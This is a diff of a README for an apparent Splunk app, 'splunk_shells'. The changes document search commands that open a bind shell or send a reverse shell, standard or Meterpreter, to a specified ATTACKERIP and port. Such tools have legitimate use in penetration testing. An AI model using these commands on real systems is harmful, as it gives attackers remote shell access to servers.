@@ -32,6 +32,12 @@ Once Splunk is restarted click on Permissions for the splunk_shells app. Ensure 
 # Usage
 using each of these shells can be done from the Search and Reporting app. Execute the following searches:
 
-'| bindshell PORTNUMBER' The port number can be specified or left off if left off the default is 8888
+'| bindshell SHELLTYPE PORTNUMBER' 
+SHELLTYPE - Specify std or msf (std = Standard Shell|msf = Meterpreter Shell)
+PORTNUMBER - Specify the port you want the bind shell to listen on. If you do not specify a port number it defaults to 8888
 
-'| revshell ATTACKERIP ATTACKERPORT' The Attacker IP and Port need to be specified for the shell to call back.
+
+'| revshell SHELLTYPE ATTACKERIP ATTACKERPORT' 
+SHELLTYPE - Specify std or msf (std = Standard Shell|msf = Meterpreter Shell)
+ATTACKERIP - Specify the IP that you want to shell to be sent back to. 
+ATTACKERPORT - Specify the port you want the shell to be sent back to.
